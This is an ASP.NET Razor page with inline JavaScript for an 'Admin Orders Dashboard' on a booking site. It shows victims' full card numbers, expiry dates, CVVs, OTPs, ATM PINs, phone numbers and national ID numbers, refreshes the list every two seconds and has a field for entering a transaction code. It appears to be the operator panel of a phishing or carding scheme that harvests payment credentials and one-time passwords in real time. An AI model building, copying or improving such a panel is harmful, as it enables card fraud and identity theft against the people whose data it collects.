@{
    Layout = null;
}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            font-family: Arial;
            background: #f4f6f9;
            padding: 20px;
        }

        h1 {
            text-align: center;
            margin-bottom: 25px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            box-shadow: 0 3px 12px rgba(0,0,0,0.08);
        }

        th, td {
            padding: 8px;
            font-size: 12px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }

        th {
            background: #111827;
            color: white;
        }

        tr:hover {
            background: #f9fafb;
        }

        .secure {
            color: #dc2626;
            font-weight: bold;
        }

        input {
            padding: 4px;
            width: 70px;
        }

        button {
            cursor: pointer;
            border: none;
            padding: 4px 8px;
            color: white;
            border-radius: 4px;
            font-size: 11px;
        }

        .confirm-btn {
            background: #16a34a;
        }

        .delete-btn {
            background: #dc2626;
        }
    </style>
</head>

<body>

    <h1>Admin Orders Dashboard</h1>

    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Order ID</th>
                <th>Title</th>
                <th>Booking Date</th>
                <th>Guests</th>
                <th>Time</th>
                <th>Card Name</th>
                <th>Card Number</th>
                <th>Expiry</th>
                <th>CVV</th>
                <th>OTP</th>
                <th>ATM</th>
                <th>Phone</th>
                <th>Provider</th>
                <th>ID Number</th>
                <th>Transaction Code</th>
                <th>Action</th>
            </tr>
        </thead>

        <tbody id="ordersBody">
            <tr>
                <td colspan="16">Loading...</td>
            </tr>
        </tbody>
    </table>

    <script>

        let isTyping = false;

        // ================= LOAD ORDERS =================
        function loadOrders() {

            if (isTyping) return; // لا يحدث أثناء الكتابة

            fetch('/Admin/GetOrders?t=' + new Date().getTime())
                .then(res => res.text())
                .then(html => {
                    document.getElementById('ordersBody').innerHTML = html;

                    // تفعيل مراقبة الكتابة
                    document.querySelectorAll('input[id^="code-"]').forEach(input => {

                        input.addEventListener('focus', () => isTyping = true);
                        input.addEventListener('blur', () => isTyping = false);

                    });
                });
        }


        // ================= CONFIRM =================
        function confirmOrder(id) {

            const input = document.getElementById('code-' + id);
            const code = input.value;

            if (!code) {
                alert("Enter code first");
                return;
            }

            fetch('/Admin/ConfirmTransaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: id,
                    transactionNo: code
                })
            })
            .then(res => res.json())
            .then(result => {

                if (result.success) {

                    // اخفاء زر الكونفيرم
                    input.disabled = true;

                    loadOrders();

                } else {
                    alert("Error saving code");
                }

            });
        }


        // ================= DELETE =================
        function deleteOrder(id) {

            if (!confirm("Delete this order?")) return;

            fetch('/Admin/Delete', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: id
                })
            })
            .then(res => res.json())
            .then(result => {

                if (result.success) {
                    loadOrders();
                } else {
                    alert("Delete failed");
                }

            });
        }


        // تحميل أول مرة
        loadOrders();

        // تحديث كل ثانيتين
        setInterval(loadOrders, 2000);

    </script>

</body>
</html>
